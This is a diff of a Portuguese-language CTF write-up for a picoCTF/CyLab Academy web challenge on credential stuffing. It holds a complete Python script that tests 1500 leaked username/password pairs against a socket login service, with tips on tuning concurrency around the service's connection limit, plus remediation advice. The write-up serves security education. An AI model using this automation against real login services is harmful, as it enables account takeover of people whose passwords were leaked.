@@ -1,91 +1,119 @@
-# Credential Stuffing | picoCTF 2026
+# Credential Stuffing | picoCTF 2026 (CyLab Academy)
 
-`web` `credential-stuffing` `automation` `pwntools` `threads`
+`web` `credential-stuffing` `automation` `sockets` `threads`
 
 | | |
 |---|---|
 | **Plataforma / evento** | picoCTF 2026 |
+| **Plataforma (hoje)** | CyLab Academy (`cylabacademy.net`) |
 | **Categoria** | Web Exploitation |
 | **Dificuldade / pontos** | Medium |
 | **Autor do desafio** | David Gaviria |
-| **Resolvido em** | 2026-05-18 |
+| **Resolvido / revalidado em** | 2026-11-02 |
 
 ## TL;DR
 
-O desafio dá um dump de 1500 pares `usuario;senha` vazados e um serviço de login por socket. Automatizo o envio de cada par ao serviço e procuro `picoCTF{` na resposta pós-login. O par `lonna;compass` (um dos últimos do dump) é reaproveitado no banco e devolve a flag.
+O desafio dá um dump de 1500 pares `usuario;senha` vazados e um serviço de login por socket. Automatizo o envio de cada par ao serviço e procuro uma resposta sem `Invalid` (login aceito). Um dos pares do dump foi reusado no banco e devolve a flag.
 
 > [!IMPORTANT]
 > **Ideia-chave:** credential stuffing explora **reúso de senha**. Credenciais vazadas em um lugar funcionam em outro quando a pessoa repete a mesma senha. O ataque é só automação: testar o dump inteiro contra o alvo.
+
+> [!WARNING]
+> O par válido **e o sufixo da flag mudam a cada instância** (o serviço sorteia qual credencial do dump é válida). Na minha validação de 2026-11-02 o par vencedor foi `ehi:smack`; na sua pode ser outro. O dump (os 1500 usuários) é o mesmo — o método não muda.
 
 ## Enunciado
 
 > Credential stuffing is the automated injection of stolen username and password pairs ("credentials") in to website login forms, in order to fraudulently gain access to user accounts. (...) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump here.
 
-**Arquivos:** [`files/creds-dump.txt`](files/creds-dump.txt) — 1500 pares `usuario;senha`. **Instância:** serviço de login por socket (host e porta do picoCTF).
+**Arquivos:** [`files/creds-dump.txt`](files/creds-dump.txt) — 1500 pares `usuario;senha`. **Instância:** serviço de login por socket (host e porta gerados pela plataforma).
 
 ## Dicas progressivas
 
 <details><summary>Dica 1</summary>O serviço pede <code>Username:</code> e <code>Password:</code> em sequência. Dá para scriptar.</details>
-<details><summary>Dica 2</summary>Teste cada par do dump; a resposta de sucesso contém a flag.</details>
-<details><summary>Dica 3</summary>São 1500 tentativas: use concorrência moderada (uns 10 workers) para não derrubar a instância.</details>
+<details><summary>Dica 2</summary>Teste cada par do dump; a resposta de sucesso contém a flag (as inválidas dizem <code>Invalid</code>).</details>
+<details><summary>Dica 3</summary>São 1500 tentativas, mas o serviço só aceita <b>3-4 conexões simultâneas</b>: com mais workers que isso, todas as conexões são recusadas. Use concorrência baixa.</details>
 
 ## Ambiente
 
-- **Máquina atacante:** Kali Linux, com `python3` e `pwntools` (`pip install pwntools`).
+- **Máquina atacante:** Kali Linux, com `python3` (só a stdlib — `socket` + `concurrent.futures`).
 - **Arquivo:** `files/creds-dump.txt` na raiz da pasta do desafio.
 
-Na minha instância o serviço estava em `crystal-peak.picoctf.net:52170`. Use o da sua.
+Na minha instância o serviço estava em `xebec.cylabacademy.net:10001`. Use o da sua.
 
 ***INSERIR no terminal — Kali (atacante)
 
 ```bash
-export TARGET_HOST=crystal-peak.picoctf.net TARGET_PORT=52170
+export TARGET_HOST=xebec.cylabacademy.net TARGET_PORT=10001
 ```
 
 ## Resolução
 
 ### 1. Entendendo o protocolo do serviço
 
-Conectando manualmente, o serviço é um prompt de banco online que pede `Username:` e, em seguida, `Password:`. Com credenciais válidas, responde `Welcome <user>!` e imprime a flag; com inválidas, recusa. O formato do dump é `usuario;senha`, uma por linha.
+Conectando manualmente, o serviço é um banco online que pede `Username:` e, em seguida, `Password:`. Com credenciais válidas responde `Welcome <user>!` e imprime a flag; com inválidas, responde `Invalid username or password` e **fecha a conexão** (uma tentativa por conexão). O formato do dump é `usuario;senha`, uma por linha.
+
+***INSERIR no terminal — Kali (atacante)
+
+```bash
+nc $TARGET_HOST $TARGET_PORT
+```
+
+```text
+Welcome to the Online Banking Service!
+Please enter your username & password to login.
+Username: foo
+Password: bar
+
+Invalid username or password
+```
 
 > [!TIP]
 > **Conceito: credential stuffing.** Diferente de brute force (que adivinha senhas), aqui testamos pares reais vazados, apostando que a vítima reusou a mesma senha neste serviço. A taxa de sucesso é baixa por par, mas alta no agregado quando há reúso. Referência: [OWASP — Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing).
 
-### 2. Automatizando o teste do dump
+### 2. Calibrando a concorrência
 
-Escrevo um script com `pwntools` que, para cada par, abre uma conexão, manda usuário e senha nos prompts e verifica se a resposta contém `picoCTF{`. Testo em paralelo com poucos workers.
+São 1500 pares. A primeira ideia é paralelizar bastante, mas **isso não funciona aqui**:
 
-> **Isso precisou de ajuste** (não é um beco sem saída, é calibração): com muitos workers a instância derrubava conexões (`incomplete`/`error`). Baixei para **10 workers**, com um pequeno `sleep(0.01)` entre os envios, e aí ficou estável (`invalid=250 incomplete=0 error=0` por lote). O script final já vem com esse valor.
+> **Isso não funcionou (pule ao replicar):** com 25-30 workers, **todas** as conexões voltam com erro (`err=200/200` num lote de teste) — o serviço recusa conexões simultâneas em excesso.
 
-#### `scripts/script1.py`
+Medindo em lotes pequenos, o serviço tolera **3-4 conexões ao mesmo tempo**. Com `WORKERS=4` e mandando usuário e senha na mesma escrita (o serviço lê as duas linhas em sequência, então não preciso esperar cada prompt), a vazão fica em ~12 pares/s e as respostas voltam limpas (`Invalid` nas erradas). O dump inteiro roda em ~1-2 min.
+
+### 3. Automatizando o teste do dump
+
+O [`scripts/script1.py`](scripts/script1.py) abre uma conexão por par (4 em paralelo), manda `usuario\nsenha\n` e para na primeira resposta sem `Invalid`.
 
 ```python
 #!/usr/bin/env python3
-from pwn import *
+import socket, os
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import threading, re, time
 
-HOST = "crystal-peak.picoctf.net"
-PORT = 52170
+HOST = os.environ.get("TARGET_HOST", "xebec.cylabacademy.net")
+PORT = int(os.environ.get("TARGET_PORT", "10001"))
 CREDS_FILE = "files/creds-dump.txt"
-WORKERS = 10  # calibrado: estável, sem derrubar a instância
+WORKERS = 4  # o serviço recusa conexões com concorrência alta
 
-context.log_level = "error"
-found_event = threading.Event()
+FOUND = {}
 
-def try_login(index, username, password):
-    if found_event.is_set():
+def try_login(up):
+    if FOUND:
         return None
+    u, p = up
     try:
-        io = remote(HOST, PORT, timeout=5)
-        io.sendlineafter(b"Username:", username.encode(), timeout=5)
-        io.sendlineafter(b"Password:", password.encode(), timeout=5)
-        result = io.recvall(timeout=2)
-        io.close()
-        if b"picoCTF{" in result:
-            found_event.set()
-            return {"index": index, "username": username,
-                    "password": password, "response": result.decode(errors="replace")}
+        s = socket.create_connection((HOST, PORT), timeout=8)
+        s.settimeout(6)
+        s.sendall(u.encode() + b"\n" + p.encode() + b"\n")  # Username + Password juntos
+        data = b""
+        for _ in range(10):
+            d = s.recv(4096)
+            if not d:
+                break
+            data += d
+            if b"}" in data or b"Invalid" in data:
+                break
+        s.close()
+        r = data.decode(errors="replace")
+        if "Invalid" not in r and r.strip():
+            return (u, p, r)
     except Exception:
         return None
     return None
@@ -96,25 +124,17 @@ def main():
         for line in f:
             line = line.strip()
             if line and ";" in line:
-                u, p = line.split(";", 1)  # split(';',1): senha pode conter ';'
+                u, p = line.split(";", 1)  # senha pode conter ';'
                 creds.append((u, p))
-
-    print(f"[*] {len(creds)} credenciais, {WORKERS} workers")
+    print(f"[*] {len(creds)} credenciais, {WORKERS} workers, alvo {HOST}:{PORT}")
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
-        futures = []
-        for i, (u, p) in enumerate(creds, 1):
-            if found_event.is_set():
-                break
-            futures.append(ex.submit(try_login, i, u, p))
-            time.sleep(0.01)  # espaça os envios
-        for fut in as_completed(futures):
+        futs = {ex.submit(try_login, up): up for up in creds}
+        for fut in as_completed(futs):
             r = fut.result()
             if r:
-                print(f"\n[+] linha {r['index']}: {r['username']}:{r['password']}")
-                print(r["response"])
-                m = re.search(r"picoCTF\{[^}]+\}", r["response"])
-                if m:
-                    print(f"[+] FLAG: {m.group(0)}")
+                FOUND["hit"] = r
+                print(f"\n[+] par válido: {r[0]}:{r[1]}")
+                print(r[2])
                 return
 
 if __name__ == "__main__":
@@ -128,33 +148,32 @@ python3 scripts/script1.py
 ```
 
 ```text
-[+] linha 1415: lonna:compass
-=========================================
+[*] 1500 credenciais, 4 workers, alvo xebec.cylabacademy.net:10001
+
+[+] par válido: ehi:smack
 Welcome to the Online Banking Service!
-=========================================
-Username: lonna
-Password: compass
+Username: Password:
 Authenticating...
-Welcome lonna!
-picoCTF{d0nt_r3u5e_cr3d3nt1als_204dfe14}
+Welcome ehi!
+academy{d0nt_r3u5e_cr3d3nt1als_8fcXXXXX}
 ```
 
 ## Cadeia de ataque
 
 ```mermaid
 flowchart LR
-    A[Dump de 1500 credenciais] --> B[Para cada par: Username/Password no socket]
-    B --> C{"picoCTF{ na resposta?"}
-    C -->|lonna:compass| D[Login aceito, flag impressa]
+    A[Dump de 1500 credenciais] --> B[Para cada par: usuario/senha no socket, 4 workers]
+    B --> C{Resposta sem Invalid?}
+    C -->|par reusado no banco| D[Login aceito, flag impressa]
 ```
 
 ## Por que funciona
 
-O serviço aceita login por um par válido qualquer do banco. Como o dump contém credenciais reaproveitadas que **existem** nesse banco (reúso de senha), basta encontrar o par certo testando todos. Não há proteção contra automação em massa (rate limit, CAPTCHA, bloqueio por tentativas), então o ataque roda até achar. A própria flag (`d0nt_r3u5e_cr3d3nt1als`) é a lição.
+O serviço aceita login por um par válido qualquer do banco. Como o dump contém uma credencial que **existe** nesse banco (reúso de senha), basta encontrá-la testando todos. Não há MFA nem CAPTCHA; a única defesa é o limite de conexões simultâneas, que só atrasa o ataque (resolvido baixando a concorrência). A própria flag (`d0nt_r3u5e_cr3d3nt1als`) é a lição.
 
 ## Remediação
 
-- Rate limiting e bloqueio progressivo por IP/conta após tentativas falhas.
+- Rate limiting e bloqueio progressivo por IP/conta após tentativas falhas (o limite de conexões aqui era fraco demais — só exigiu baixar workers).
 - MFA, que quebra o ataque mesmo com a senha correta.
 - Monitorar e barrar logins automatizados (device fingerprinting, CAPTCHA em comportamento suspeito).
 - Do lado do usuário: senhas únicas por serviço e gerenciador de senhas.
@@ -162,15 +181,16 @@ O serviço aceita login por um par válido qualquer do banco. Como o dump conté
 ## Lições e padrões
 
 - **Sinais para reconhecer:** sempre que um desafio entrega uma lista de credenciais e um login, é credential stuffing — o trabalho é de automação e estabilidade, não de técnica.
-- **Da próxima vez eu tentaria primeiro:** calibrar a concorrência em um lote pequeno antes de disparar as 1500, para não derrubar a instância e perder tempo.
+- **Da próxima vez eu tentaria primeiro:** calibrar a concorrência num lote pequeno antes de disparar as 1500 — aqui 30 workers davam 100% de erro e 4 workers resolviam.
+- **Onde perdi tempo:** assumir que mais workers = mais rápido. O gargalo era o limite de conexões do serviço, não a minha máquina.
 
 ## Referências
 
 - [OWASP — Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
-- [pwntools — tubes/remote](https://docs.pwntools.com/en/stable/tubes/sockets.html)
+- [Python — `socket` / `concurrent.futures`](https://docs.python.org/3/library/concurrent.futures.html)
 
 ## Flag
 
 ```text
-picoCTF{d0nt_r3u5e_cr3d3nt1als_204dfe14}
+academy{d0nt_r3u5e_cr3d3nt1als_8fcXXXXX}
 ```
